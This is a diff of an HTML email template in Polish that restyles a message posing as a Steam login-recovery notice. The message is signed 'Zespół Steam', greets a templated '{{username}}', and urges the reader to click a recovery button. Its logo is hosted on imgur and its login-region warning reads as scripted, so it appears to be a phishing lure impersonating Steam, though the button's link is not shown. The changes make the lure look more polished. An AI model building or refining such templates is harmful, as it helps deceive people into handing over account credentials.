@@ -21,32 +21,46 @@
             border-radius: 8px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             min-height: 600px;
+            clear: both;
         }
-        .logo {
-            margin-bottom: 20px;
+        .logo-container {
             text-align: left;
+            margin-bottom: 30px;
         }
+
+        .logo {
+            display: block;
+            margin: 0 auto;
+        }
+
         h1 {
             font-family: 'Verdana', sans-serif;
-            font-size: 24px;
+            font-size: 32px;
             font-weight: bold;
             margin-bottom: 20px;
             text-align: justify;
-            color: #b3b3b3
+            color: #b3b3b3;
         }
         p {
             font-family: 'Tahoma', sans-serif;
-            font-size: 16px;
             line-height: 1.8;
-            margin-bottom: 20px;
-            text-align: justify;
+            margin-bottom: 30px;
             color: #ffffff
+        }
+        .bold-text {
+            font-family: 'Tahoma', sans-serif;
+            font-size: 26px;
+            line-height: 1.8;
+            margin-bottom: 30px;
+            text-align: left;
+            color: #ffffff;
+            font-weight: bold;
         }
         .button-container {
             background-color: #17191c;
             padding: 20px 0;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
         .button {
             display: inline-block;
@@ -58,28 +72,47 @@
             border-radius: 5px;
         }
         .footer {
-            margin-top: 20px;
-            font-size: 14px;
+            margin-top: 30px;
+            font-size: 18px;
             color: #c7d5e0;
             line-height: 1.6;
-            text-align: center;
+            text-align: left;
+        }
+        .middle {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #c7d5e0;
+            line-height: 1.6;
+            text-align: left;
         }
         .highlight {
             color: #66c0f4;
             text-decoration: none;
         }
+        .vertical-line {
+            width: 5px;
+            height: 80px;
+            background-color: #2564d2;
+            margin-right: 20px;
+            display: inline-block;
+            vertical-align: middle;
+            float: left;
+        }
+
     </style>
 </head>
 <body>
     <div class="container">
         <!-- Logo -->
-        <img src="https://i.imgur.com/uKEMuDb.png" class="logo" width="100">
+        <div class="logo-container">
+            <img src="https://i.imgur.com/uKEMuDb.png" class="logo" width="100">
+        </div>
 
         <!-- Welcome Message -->
         <h1>Witaj, {{username}}!</h1>
 
         <!-- Recovery Instructions -->
-        <p>Kliknij poniższy link, by odzyskać dane logowania do Steam:</p>
+        <p class="bold-text">Kliknij poniższy link, by odzyskać dane logowania do Steam:</p>
 
         <!-- Recovery Button -->
         <div class="button-container">
@@ -87,10 +120,12 @@
         </div>
 
         <!-- Additional Information -->
-        <p>
+        <p class="middle">
             Jeśli nie próbujesz odzyskać swoich danych logowania do konta Steam z komputera znajdującego się w regionie
             <span class="highlight">Mazowieckie, Polska</span>, zignoruj tę wiadomość. Być może inny użytkownik podał niepoprawne dane logowania do swojego konta.
         </p>
+
+        <div class="vertical-line"></div>
 
         <!-- Closing -->
         <p class="footer">Pozdrawiamy<br>Zespół Steam</p>
